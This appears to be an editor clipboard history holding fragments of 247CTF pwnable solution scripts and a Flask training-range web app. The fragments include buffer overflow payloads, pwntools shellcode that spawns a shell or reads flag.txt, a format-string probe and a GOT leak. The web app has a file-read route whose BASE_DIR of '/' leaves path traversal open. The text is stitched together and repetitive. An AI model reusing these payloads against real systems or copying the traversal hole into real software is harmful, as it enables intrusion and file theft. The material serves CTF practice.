78d3513864c9dc98435816876f24cf39|file:///home/neo/247ctf/pwnable/sol_hidden.py|49|1|V|python
	OFFSET = 
1860a3729c8b25c7c60cfb8233383340|file:///home/neo/247ctf/pwnable/sol_hidden.py|10|1|V|python
	host = args.HOST or 'svc.pwnable.xyz' 0cc0cea9c5b9db31.247ctf.com
	port = int(args.PORT or 50354)
fc6985570fa71a104098ac9bdac028ef|file:///home/neo/247ctf/pwnable/sol_hidden.py|10|39|v|python
	0cc0cea9c5b9db31.247ctf.com
fc6985570fa71a104098ac9bdac028ef|file:///home/neo/247ctf/pwnable/sol_hidden.py|10|39|v|python
	0cc0cea9c5b9db31.247ctf.com
b9b33b115e4b73a3b30cb6ef47afce08|file:///home/neo/247ctf/pwnable/sol_params.py|57|29|v|python
	p32(FLAG_ADDR)
cc3825fa53bb72fefb55b458ed9d454a|file:///home/neo/247ctf/pwnable/sol_params.py|58|13|v|python
	b'a' * OFFSET + 
39e33be45ef40860505b76e4a5c031c2|file:///home/neo/247ctf/pwnable/sol_params.py|58|1|V|python
	payload += p32(0x1337)
06ed01aca3fa9d9ca8778d78eb2ed42c|file:///home/neo/247ctf/pwnable/sol_params.py|59|16|v|python
	0x1337
3d15c881ee7df6640b2952a87404300f|file:///home/neo/247ctf/pwnable/sol_params.py|10|21|v|python
	'0cc0cea9c5b9db31.247ctf.com' 
aceca000e4bcba1a8b7dcd113c2e1756|file:///home/neo/247ctf/pwnable/sol_params.py|10|21|v|python
	c3beec751af9dc03.247ctf.com
aceca000e4bcba1a8b7dcd113c2e1756|file:///home/neo/247ctf/pwnable/sol_params.py|10|21|v|python
	c3beec751af9dc03.247ctf.com
7f889ca313de125b3fd249f7fda2e6c1|file:///home/neo/247ctf/pwnable/sol_params.py|60|1|V|python
	payload += p32(0x12345678)
8cc7fd9fbdb0e3d731b73a10348f4750|file:///home/neo/247ctf/pwnable/sol_environ.py|9|17|V|python
	    addr = r.recvuntil('!')[:-1]
	    print(addr[:3])
43b0741d89b4d6198298fbf12df3bbfb|file:///home/neo/247ctf/pwnable/sol_environ.py|10|5|V|python
	    print(addr[:3])
05fc49dd23d226b6859e40155571cb37|file:///home/neo/247ctf/pwnable/sol_environ.py|7|1|V|python
	    r.sendline('%'+str(i)+'$p')
	    r.recvuntil('back ')
	    addr = r.recvuntil('!')[:-1]
9d297144c65e12e0c3fed8f033dda4ef|file:///home/neo/247ctf/pwnable/sol_notes.py|29|1|V|python
	            b flag
3dacb6a7d1c1bdae95dea4383c610f28|file:///home/neo/247ctf/pwnable/sol_notes.py|49|13|V|python
	FLAG_ADDR = exe.sym.flag
	
	# io.sendline(cyclic(1024))
	OFFSET = cyclic_find(0x6261616b)
	log.info('Offset: %d' % OFFSET)
	
	payload = b'a' * OFFSET
	payload += p32(FLAG_ADDR)
	payload += b'aaaa'
	payload += p32(0x1337)
	payload += p32(0x247)
	payload += p32(0x12345678)
	io.sendline(payload)
6d84fcaf507abd99dfefa86cb455fad4|file:///home/neo/247ctf/pwnable/sol_notes.py|44|1|V|python
	def create_small(size):
	    io.sendline('small')
	    io.recvuntil('note:\n')
	    io.sendline(str(size))
	    io.recvuntil('data:\n')
	    io.sendline('a'*size)
6b80a2d4b2783cd62e4bb53b631f2b62|file:///home/neo/247ctf/pwnable/sol_notes.py|51|1|V|python
	def create_medim(size):
	    io.sendline('medium')
	    io.recvuntil('note:\n')
	    io.sendline(str(size))
	    io.recvuntil('data:\n')
	    io.sendline('a'*size)
	
	def create_small(size):
	    io.sendline('small')
	    io.recvuntil('note:\n')
	    io.sendline(str(size))
	    io.recvuntil('data:\n')
	    io.sendline('a'*size)
f7bd60b75b29d79b660a2859395c1a24|file:///home/neo/247ctf/pwnable/sol_notes.py|44|23|v|python
	size
6f14862b21c44924c431452a9b1f0be5|file:///home/neo/247ctf/pwnable/sol_notes.py|45|17|v|python
	'small'
ac0198c5f485509138e0607abf14256e|file:///home/neo/247ctf/pwnable/sol_notes.py|60|1|V|python
	create_type('large', MAX_LARGE)
51f3cd86c6784772f3c6fd6586fa6159|file:///home/neo/247ctf/pwnable/sol_notes.py|60|22|v|python
	MAX_LARGE
3512a01c558259960fba797c1fddb702|file:///home/neo/247ctf/pwnable/sol_notes.py|60|1|V|python
	create_type('large', MAX_SMALL)
	create_type('large', MAX_LARGE + 1)
afacdb0a401ccdf6b48551bbc00e8a74|file:///home/neo/247ctf/pwnable/sol_notes.py|62|14|v|python
	large
71726adf0ff60cd03eaf3c515883eeb8|file:///home/neo/247ctf/pwnable/sol_notes.py|63|26|v|python
	LARGE
5e0959d35a6a5c8ce3471032442227bf|file:///home/neo/247ctf/pwnable/sol_notes.py|60|1|V|python
	io.recvuntil('command:\n')
2ae69da6d8d0e64d5fc0570565f75b77|file:///home/neo/247ctf/pwnable/sol_notes.py|11|34|v|python
	:50481
3865d65230a8d1fcbe8f55ba405edadc|file:///home/neo/247ctf/pwnable/sol_notes.py|11|1|v|python
	tcp:/
47162fa013ef9ad62d116cf80f5ca405|file:///home/neo/247ctf/pwnable/sol_notes.py|11|1|V|python
	50ba6dbb8aa53e01.247ctf.com
6579ce0b81625e8e4822c2bb1d9bd64f|file:///home/neo/247ctf/pwnable/sol_notes.py|10|1|v|python
	host = args.HOST or 'c3beec751af9dc03.247ctf.com' 50ba6dbb8aa53e01.247ctf.com
	port = int(args.PORT or 50481)
d2756d6b4b6bc7663e9143c267143c09|file:///home/neo/247ctf/pwnable/sol_notes.py|10|69|v|python
	47ctf.com
d2756d6b4b6bc7663e9143c267143c09|file:///home/neo/247ctf/pwnable/sol_notes.py|10|69|v|python
	47ctf.com
4d3f55a6ed7778d63006154172fff360|file:///home/neo/247ctf/pwnable/sol_notes.py|10|51|v|python
	50ba6dbb8aa53e01
905c4de7b57fd47e1c38f185cd3b09f4|file:///home/neo/247ctf/pwnable/sol_notes.py|10|56|v|python
	dbb8aa53e01.247ctf.com
905c4de7b57fd47e1c38f185cd3b09f4|file:///home/neo/247ctf/pwnable/sol_notes.py|10|56|v|python
	dbb8aa53e01.247ctf.com
4553b0f00c68af7dd9e42a7a00075385|file:///home/neo/247ctf/pwnable/sol_notes.py|10|21|v|python
	'c3beec751af9dc03.247ctf.com' 
370772e3cd268ebc96bea2a4a72d7280|file:///home/neo/247ctf/pwnable/sol_notes.py|6|31|v|python
	hidden_flag_function_with_args
109cd5fcc9b886bbb9ceb36598e8a020|file:///home/neo/247ctf/pwnable/sol_notes.py|48|5|V|python
	    if data:
48f009bd50e0f2055866e93c566d529e|file:///home/neo/247ctf/pwnable/sol_notes.py|51|25|v|python
	(size-1)
7c5f6bdd88364a31f5b7076a85b883bf|file:///home/neo/247ctf/pwnable/sol_exec.py|55|1|V|python
	
	payload = b'a' * OFFSET
	payload += p32(FLAG_ADDR)
	payload += b'aaaa'
	payload += p32(0x1337)
	payload += p32(0x247)
	payload += p32(0x12345678)
	io.sendline(payload)
7692885a63a272bae55ed7567fb5de04|file:///home/neo/247ctf/pwnable/sol_exec.py|50|1|V|python
	FLAG_ADDR = exe.sym.flag
6209bed5128faea3db2d8479f6193b95|file:///home/neo/247ctf/pwnable/sol_exec.py|29|13|V|python
	            b chall
23749c6b54c82d0186c72da6e1b924c5|file:///home/neo/247ctf/pwnable/sol_exec.py|61|43|v|python
	p32(bounce)
fe9f78d38d4e45dd0c8c7e8184f65c6e|file:///home/neo/247ctf/pwnable/sol_exec.py|59|1|V|python
	# jmp = asm('')
b4b963ba9df48bf6256bc0aebb21533a|file:///home/neo/247ctf/pwnable/sol_exec.py|59|1|V|python
	# log.info(shellcode)
1707a2c230ecb22ea535e38610e0863c|file:///home/neo/247ctf/pwnable/sol_exec.py|60|62|^v|python
	asm('jmp esp - ' + str(hex(OFFSET)))
f65680b4f917680b8c726620cba8d86d|file:///home/neo/247ctf/pwnable/sol_exec.py|60|20|v|python
	 + str(hex(OFFSET)))
9093d60e70ef19d5a0b59a63d6e4b121|file:///home/neo/247ctf/pwnable/sol_exec.py|61|1|V|python
	len(jmp)
e4e24b7b4e0a36a8bc75a66a78e6ee2e|file:///home/neo/247ctf/pwnable/sol_exec.py|62|1|V|python
	log.info(jmp)
2e418068595f86c70e2874d573bc9672|file:///home/neo/247ctf/pwnable/sol_exec.py|61|1|V|python
	len(jmp)
	log.info(jmp)
d19cc5688fd7f20c64ae75ca501f753c|file:///home/neo/247ctf/pwnable/sol_exec.py|63|13|v|python
	shellcode + shellcraft.nop().encode() * (OFFSET - len(shellcode) + 4) + p32(bounce)
56633fd2cdf7a8570f3dd05434f22f7e|file:///home/neo/247ctf/pwnable/sol_exec.py|60|1|V|python
	log.info(shellcode)
1025c4ded59320c5bdf828c3821dec58|file:///home/neo/247ctf/pwnable/sol_exec.py|61|23|v|python
	shellcraft.nop().encode() 
e3b45e3832d596ee76b9032207fe9c6a|file:///home/neo/247ctf/pwnable/sol_exec.py|60|1|V|python
	print(len(jmp))
23a817b7113a86cd2a8ab66fbd16ded9|file:///home/neo/247ctf/pwnable/sol_exec.py|63|82|v|python
	bounce
21699f572dc6cbe50568942b4e3f7149|file:///home/neo/247ctf/pwnable/sol_exec.py|61|1|V|python
	jmp = asm(shellcraft.nop()*4)
5f4075c7835ee7923506de7343966650|file:///home/neo/247ctf/pwnable/sol_exec.py|65|57|^v|python
	 - len(jmp)) + jmp 
44322ae233345e9c7b5c6ac70333ca16|file:///home/neo/247ctf/pwnable/sol_exec.py|62|1|V|python
	# jmp = rop.find_gadget(["call eax"]).address
711ad36909a53ddc0488a725e45ae2e4|file:///home/neo/247ctf/pwnable/sol_exec.py|62|1|V|python
	# log.info(jmp)
729d75bf4ae9760e4f1f3522025cef25|file:///home/neo/247ctf/pwnable/sol_exec.py|10|79|v|python
	50115
87b0cba64000c51c883f57274c04519c|file:///home/neo/247ctf/pwnable/sol_exec.py|11|30|v|python
	50014
81de3091aaaa74bf5e8408b633143128|file:///home/neo/247ctf/pwnable/sol_exec.py|10|23|v|python
	39f5b0d09742d6.247ctf.com:
81de3091aaaa74bf5e8408b633143128|file:///home/neo/247ctf/pwnable/sol_exec.py|10|23|v|python
	39f5b0d09742d6.247ctf.com:
26e8ef495977f0bb1de0c2513427d586|file:///home/neo/247ctf/pwnable/sol_exec.py|10|1|V|python
	host = args.HOST or f539f5b0d09742d6.247ctf.com
aef8c9dbe9b9e8c2c0296048e40beee1|file:///home/neo/247ctf/pwnable/sol_exec.py|10|1|v|python
	host = args.HOST or f539f5b0d09742d6.247ctf.com
	port = int(args.PORT or 50115)
de7c3918eb67996c8a29750868f153f4|file:///home/neo/247ctf/pwnable/sol_exec.py|10|21|v|python
	f539f5b0d09742d6.247ctf.com
de7c3918eb67996c8a29750868f153f4|file:///home/neo/247ctf/pwnable/sol_exec.py|10|21|v|python
	f539f5b0d09742d6.247ctf.com
c1c4a7b19df56119172c44bbbc2aaced|file:///home/neo/247ctf/pwnable/sol_exec.py|59|1|V|python
	shellcode = asm(shellcraft.i386.linux.cat("flag.txt"))
3260b1a022a43565fe7024716d68c04c|file:///home/neo/247ctf/pwnable/sol_exec.py|59|1|V|python
	# shellcode = asm(shellcraft.i386.linux.cat("flag.txt"))
16ec1d97be728bcfa44cb20d81f8cf88|file:///home/neo/247ctf/pwnable/sol_exec.py|60|1|V|python
	# jmp = asm(shellcraft.nop() * 2 + 'jmp eax;', arch='i386', os='linux')
	# log.info(jmp)
814be3bd0f1dde44ec9041c4785cf4ef|file:///home/neo/247ctf/pwnable/sol_nonexec.py|29|1|V|python
	            b asm_bounce
	            b chall
91e3d3c01021241043151d3d3d2bea82|file:///home/neo/247ctf/pwnable/sol_nonexec.py|55|1|V|python
	SHELLCODE_ADDR = 0xffde9c2c
	io.recvuntil('though:\n')
	shellcode = asm(shellcraft.i386.linux.sh())
	CALL_EAX = 0x08048410
	payload = shellcode + b'\x90' * (OFFSET - len(shellcode)) + p32(CALL_EAX)
	log.info(payload)
0aab347645d87a1dfed4036e7ca3d1d6|file:///home/neo/247ctf/pwnable/sol_nonexec.py|49|1|V|python
	bounce = exe.sym.asm_bounce
326e34d78d8f73276630508348c4cbed|file:///home/neo/247ctf/pwnable/sol_nonexec.py|56|1|V|python
	log_addr("main", MAIN_ADDR)
81e9ee43942ae093f02afda08b348a04|file:///home/neo/247ctf/pwnable/sol_nonexec.py|64|1|V|python
	print(io.recvline().strip())
ad921d60486366258809553a3db49a4a|file:///home/neo/247ctf/pwnable/sol_nonexec.py|68|1|v|python
	unknown
f88c967c823af458243bd26b225798e0|file:///home/neo/247ctf/pwnable/sol_nonexec.py|10|79|v|python
	50316
7a8b88290e0a521f559d489153e8209b|file:///home/neo/247ctf/pwnable/sol_nonexec.py|10|21|v|python
	'f539f5b0d09742d6.247ctf.com' 
2f4ce68693a939df492cbedd2d86654d|file:///home/neo/247ctf/pwnable/sol_nonexec.py|10|21|v|python
	139aca56178b006b.247ctf.com
2f4ce68693a939df492cbedd2d86654d|file:///home/neo/247ctf/pwnable/sol_nonexec.py|10|21|v|python
	139aca56178b006b.247ctf.com
2a3b24ea06db696d1098c0e93d2abfc2|file:///home/neo/247ctf/pwnable/sol_nonexec.py|10|80|v|python
	50497
d5c12a1459e5fd47259dda45eec53244|file:///home/neo/247ctf/pwnable/sol_nonexec.py|10|21|v|python
	'139aca56178b006b.247ctf.com'  
01b7d6ab92c951fe755abf60c229b7c7|file:///home/neo/247ctf/pwnable/sol_nonexec.py|10|21|v|python
	8f2a3d493364c551.247ctf.com:
01b7d6ab92c951fe755abf60c229b7c7|file:///home/neo/247ctf/pwnable/sol_nonexec.py|10|21|v|python
	8f2a3d493364c551.247ctf.com:
e65ddc4b02fceb98b1660b7ff2352161|file:///home/neo/247ctf/pwnable/sol_nonexec.py|59|1|V|python
	io.recvuntil('password:\n')
	payload = b'a' * OFFSET
	payload += p32(PUTS_PLT)
	payload += p32(MAIN_ADDR)
	payload += p32(PUTS_GOT)
	io.sendline(payload)
67506794d53399d18d2bcf72c83d821d|untitled:1|1|9|v|
	a tes
f8ba545a3b9855e4bc73895fbec84a8b|untitled:1|1|6|v|
	is test
553ac890ab17c0f98db5b8aeba11bcef|file:///home/neo/247ctf/web/hash.py|13|1|V|python
	    if hash_type == 'sha1sum':
	        if hashlib.sha1(tohash).hexdigest()[:6] == target:
	            return p
0be8ac390e35f7a9249e1a700c305609|file:///home/neo/247ctf/web/hash.py|15|1|V|python
	r = remote('jh2i.com', 50005)
98fd630e69cf29fa767371d428af9430|file:///home/neo/247ctf/web/hash.py|16|1|V|python
	    r.recvuntil('of the ')
	    hash_type = r.recvuntil(' ').decode()[:-1]
	    print(hash_type)
	    target = r.recvline().decode().split(' ')[-1][:-1]
	    print(target)
73c5fb9f8def3a94ecc23392e3daa224|file:///home/neo/247ctf/web/hash.py|22|13|V|python
	            r.sendline(c)
8a34dc7fb2758997b07fffa210a86ac9|file:///home/neo/247ctf/web/hash.py|22|13|V|python
	            print(r.recvline())
cfb4543bce27300ea68acd3c286968dc|file:///home/neo/247ctf/web/hash.py|8|13|V|python
	    global target
	    global hash_type
fe856057561e7927fd03f13cefdee9cb|file:///home/neo/247ctf/web/test.php|2|3|V|php
	  require_once('flag.php');
783996b1e2d64452448e6906dbeea4d5|file:///home/neo/247ctf/web/test.php|5|34|^v|php
	md5($salt . $_GET['password']) 
1a0ddc3ff0ebffb41fab204ac5be526c|file:///home/neo/247ctf/web/test.php|10|1|V|php
	  echo '\n';
a882717ccef247c9a0f39a85f58a9886|file:///home/neo/247ctf/web/test.php|6|3|V|php
	  echo;
5d9cb22f14b5a7fc409767f918d85f27|file:///home/neo/247ctf/web/test.php|17|7|v|php
	"0e6f16c30138213add8621effb1a170d" 
c13ce4ae8c7c4b7a45ce0dfc5ca3649f|file:///home/neo/247ctf/web/hash.py|11|8|v|python
	hashlib.md5(salt+tohash).hexdigest()
c7dbf7de01a25c16a7fb2b1692c1e03a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|5|1|V|htmldjango
	    {% block content %}
a0581ae4e7488b8c37a5e7a75ef38a32|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|130|1|V|python
	@app.route('/admin', methods=['GET'])
	@login_required
9fed7b4e358d25de3d3a1171d82d7f46|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|133|1|V|python
	    if 'role' in session.keys():
	        if session['role'] == 'admin':
eafbc14ae98f31946973879314c130ae|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/long%20redirection/container/app/app.py|18|1|V|python
	    rendered = render_template('admin.html')
	    response = make_response()
	    response.status = '302 Found'        
	    response.headers['Location'] = url_for('index')
	    response.set_data(rendered)
	    return response
31ee82367c5591e9e68f7c27fcfb44f9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|139|1|V|python
	    if 'role' in session.keys():
	        if session['role'] == 'admin':
	            return render_template('secret.html')
	    rendered = render_template('admin.html')
	    response = make_response()
	    response.status = '302 Found'        
	    response.headers['Location'] = url_for('index')
	    response.set_data(rendered)
	    return response
a3ba0fada4a6f815cb9ff2cc1be5b5f5|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|209|35|v|python
	ndex
91db25fa04c9facdbde8bd1bb66b111e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/pages/auth_only.html|3|9|V|htmldjango
	        {% include "pages/search_bar.html" %}
e22fd892378b577690391799e3090513|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/pages/auth_only.html|2|5|V|htmldjango
	    {% block spacer %}
	    {% endblock %}
f3e85986b5b668b7c9b4f3a13b8f057a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|60|1|V|python
	@app.route('/home', methods=['GET'])
	def home():
	    if 'username' in session.keys():
	        return render_template('pages/index.html')
	    else:
	        return render_template('pages/login.html')
b0d2ae669c0736d31271eb2d0dcdf357|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|224|13|V|python
	    if 'username' in session.keys():
	        return render_template('pages/index.html')
ce5039cb122c458b26cff3b1fc89a850|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|191|1|V|python
	@app.route('/contact', methods=['POST'])
c76b9433ef0587c52219e918bb4e8dc7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|192|1|V|python
	@app.route('/contact.html', methods=['POST'])
a02439ec229d8be0e74b0c1602392310|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|182|39|v|python
	POST
d26e1de6e4377fa38ef0e6047c3635e2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|182|1|V|python
	@app.route('/contact.html', methods=['GET'])
69ce17608a86f31c9c6d6a3903747ac7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|86|1|V|python
	@app.route('/profile', methods=['GET'])
167291de2eb620940f43c6418a5c15f8|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|87|1|V|python
	@app.route('/pages/profile.html', methods=['GET'])
ce98878cee2b84d8e153dea38f297edf|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|22|19|v|python
	/pages
5ea4b5be915696b721aea4b2e7fb8e7a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/test|2|5|^v|
	<img style="width:700px; height:500px" src="data:image/jpeg;base64, Z
7d780a97c524a5ea06ff46a9d6cab07c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/test|2|5|v|
	<img style="width:700px; height:500px" src="data:image/jpeg;base64, 
bca5c68d0db9ddb95941f0df7bfe0508|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|60|1|V|python
	@app.route('/home', methods=['GET'])
95c0fab86818f7c68ed09db53e2e2216|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/server.py|247|1|V|python
	@app.route('/funny', methods=['GET'])
	def funny_pictures():
	    path = os.path.join(os.getcwd(),'funny', 'one_does_not_simply')
	    encoded = ''
	
	    # get raw bytes
	    with open(path, 'rb') as f:
	        raw = f.read()
	        encoded = base64.b64encode(raw)
	
	    return render_template('funnyPictures.html', encoded=encoded.decode('ascii'), old=1)
	
	
	@app.route('/funny/getFunny', methods=['POST'])
	def get_funny():
	    # get image number and build absolute path
	    pic = request.form.get('funny')
	    path = os.path.join(os.getcwd(),'funny', pic)
	    encoded = ''
	    path = os.path.realpath(path)
	
	    # change for prod
	    BASE_DIR = '/'
	
	    if path.startswith(BASE_DIR) == False:
	        path = os.path.join(os.getcwd(),'funny', 'youve_gone_too_far')
	
	        with open(path, 'rb') as f:
	            raw = f.read()
	            encoded = base64.b64encode(raw)
	        
	        return render_template('funnyPictures.html', encoded=encoded.decode('ascii'), old=1)
	
	    # get raw bytes
	    with open(path, 'rb') as f:
	        raw = f.read()
	        encoded = base64.b64encode(raw)
	
	    return render_template('funnyPictures.html', encoded=encoded.decode('ascii'), old=pic)
	
69254da21f549775b053b48ccb74b090|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|295|1|V|python
	# @app.route('/', defaults={'req_path': ''})
	# @app.route('/<path:req_path>')
	# def dir_listing(req_path):
	#     BASE_DIR = ppath
	
	#     # Joining the base and the requested path
	#     abs_path = os.path.join(BASE_DIR, req_path)
	
	#     # Return 404 if path doesn't exist
	#     if not os.path.exists(abs_path):
	#         return abort(404)
	
	#     # Check if path is a file and serve
	#     if os.path.isfile(abs_path):
	#         return send_file(abs_path)
	
	#     # Show directory contents
	#     files = os.listdir(abs_path)
	#     return render_template('pages/files.html', files=files)
8704daa9d50eb980c40510d39c931bfe|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|255|14|v|python
	funny
338b0191931e56677363d3e4d3a4885c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|256|5|v|python
	funny_pictures
208d2690607c4e3d3fabfa1d18673d36|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|65|33|v|python
	pages/
18c4e3db3c0889282ba3133d9d6d2117|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|1|13|v|htmldjango
	layout.html" %}
	    {% block spacer %}
	        {% include "
604a47346facbd07990083e6c1948914|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|23|1|V|python
	# ppath = "templates"
	# AutoIndex(app, browse_root=ppath)
24dddcaf4233c37f943cf5c6fb88f148|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|243|1|V|python
	@app.route('/logout', methods=['GET'])
3947dbb3e652323ed895fefd3c792032|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|243|1|V|python
	@app.route('/logout', methods=['GET'])
	@login_required
4236a440a662cc8253d7536e5aa17942|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|255|14|v|python
	logout
a81259cef8e959c624df1d456e5d3297|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|259|27|v|python
	static
7647a65679da1134787fdac7ebd5c44c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|274|1|V|python
	@app.route('/static', methods=['GET'])
	@login_required
	def make_tree(response=None):
	    path = 'static'
	    tree = dict(name=path, children=[])
	    try: lst = os.listdir(path)
	    except OSError:
	        pass #ignore errors
	    else:
	        for name in lst:
	            fn = os.path.join(path, name)
	            if os.path.isdir(fn):
	                tree['children'].append(make_tree(fn))
	            else:
	                tree['children'].append(dict(name=fn))
	    return tree
	
c43d25d5d1ad985d711603bcc76f6c78|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|258|17|v|python
	/Users/vivek/Desktop
8a0a3f4d699eb6f724aa0fccfe2db31b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|256|1|V|python
	@app.route('/<path:req_path>')
b6e11645ad5dae6c0b0fd1d7ec8ddac1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|254|1|V|python
	
	@app.route('/js/<path:path>')
9c9db32dce83c5309a92f8fb050fe3f8|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/files.html|4|22|v|html
	request.path + '/' if request.path != '/' else ''
f3e30d2fdc2854353c39848ecbc6e8cb|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|311|5|V|python
	    with open(path, 'rb') as f:
	        raw = f.read()
	        encoded = base64.b64encode(raw)
	
	    return render_template('funnyPictures.html', encoded=encoded.decode('ascii'), old=pic)
def372e559b481282ae749e98de8f5d7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|274|28|v|python
	abs_path
694b185316a9f2e8cd008f905ff7b95b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|262|5|V|python
	    print(req_path)
43d2c12f345fe7aeaee825dfbc6cd44d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|273|1|V|python
	    # elif os.path.isdir(abs_path):
	    #     return dir_listing(defaults=)
cbd229878162e9048bd542194d6c64f1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/files.html|2|1|V|html
	    {% for file in files %}
26d56a42236c384ff32075e5544ae146|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/files.html|2|1|V|html
	    {% for file in files %}
	    <li>
	        <a href="{{ (request.path + '/' if request.path != '/' else '') + file }}">
	            {{ (request.path + '/' if request.path != '/' else '') + file }}
	        </a>
	    </li>
	    {% endfor %}
05e6cc7c09e5b5292a46a83fe9d5294a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|276|1|V|python
	    files = [f for f in files if os.path.isfile(abs_path+'/'+f)]
eba5211547c0bf3ccfc12580b03842ce|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|274|5|V|python
	    # Show directory contents
233914e09fe594fd226bf44cfd8ea0e3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|259|1|V|python
	@app.route()
5dcca51e13177fb1fce1ccc790a8a87a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|259|1|V|python
	@app.route('/static', defaults={'req_path': ''})
1d99ec263836233172361766d1933aaf|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|260|24|^v|python
	defaults={'req_path': ''}
69b63729a6789f8912c6bdc0c906f698|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|255|31|V|python
	# @app.route('/static/<path:path>')
	# def send_js(path):
	#     return send_from_directory('static', path)
c1a7386576b9e49b70e9a3ba45abedcb|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|7|1|V|python
	from flask_autoindex import AutoIndex
704293e54563038f0c4311d7982cc09d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|268|16|v|python
	send_static_file
b3431d56aebf6da87e5c92d646f41e5e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|261|5|V|python
	    app.logger('%s', abs_path)
29426b8c85691cb648890eca58ded77d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|256|1|V|python
	# @app.route('/static/<req_path>')
d05cd7d921e4432c1f22a02fdf75ab4f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/82a9d051916e08825a8410cd89bb1b13/secret.html|1|1|V|htmldjango
	{% extends "pages/layout.html" %}
	    {% block content %}
72197923ba80a8a9039e321c6fc7a619|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/82a9d051916e08825a8410cd89bb1b13/secret.html|4|5|V|htmldjango
	    {% endblock %}
95702ccb9ac62f2a796c79b7cc080722|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/server.py|116|9|V|python
	        print query
5ac00779729bb8040dd8d39426d822b7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/server.py|117|9|V|python
	        print result
cea56a6bee20fb65a9f7f1b3372247d1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|9|4|V|html
	  	<nav class="navbar navbar-inverse">
		  <div class="container-fluid">
			<div class="navbar-header">
			  <a class="navbar-brand" href="/">Deflect</a>
	      <a class="navbar-brand" href="/search">Search Weapon</a>
	      {% if role == "admin" %}
	      {% set color='#ba1316' %}
	      {% set text_role='Admin' %}
	      <a class="navbar-brand" href="/admin">Admin</a>
	      {% else %}
	      {% set color='#337ab7' %}
	      {% set text_role='User' %}
	      {% endif %}   
			</div>
			<ul class="nav navbar-nav navbar-right">
			  <li>
				<a href="/logout"><span class="glyphicon glyphicon-log-out"></span> Logout</a>
			  </li>
			</ul>
		  </div>
		</nav>
a28d71add039a0279f8ea4cf4f96f762|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|2|5|V|html
	<html>
	  <head>
	    <title>Funny Pictures</title>
	    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
	    <link rel="stylesheet" type="text/css" href="/css/styles.css">
	  </head>  
	  <body>
f7cab59c0613267da3106134cda14071|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|34|1|V|html
	  </body>
	</html>
f45451f4d07ca1f5bab9ed278e880c5f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|1|1|V|html
	<!doctype html>
